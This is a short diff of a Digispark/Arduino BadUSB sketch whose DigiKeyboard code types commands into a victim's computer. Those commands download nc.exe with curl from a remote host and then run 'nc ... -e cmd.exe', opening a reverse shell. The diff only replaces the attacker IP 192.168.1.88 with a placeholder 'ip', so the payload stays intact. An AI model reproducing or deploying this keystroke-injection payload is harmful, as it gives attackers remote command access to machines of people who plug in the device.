@@ -16,10 +16,10 @@ void loop() {
   DigiKeyboard.delay(500);
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   DigiKeyboard.delay(500);
-  DigiKeyboard.print("curl -o nc.exe 192.168.1.88/nc.exe");
+  DigiKeyboard.print("curl -o nc.exe ip /nc.exe");
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   DigiKeyboard.delay(500);
-  DigiKeyboard.print("nc 192.168.1.88 8080 -e cmd.exe");
+  DigiKeyboard.print("nc ip -e cmd.exe");
   DigiKeyboard.delay(500);
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   DigiKeyboard.delay(500);
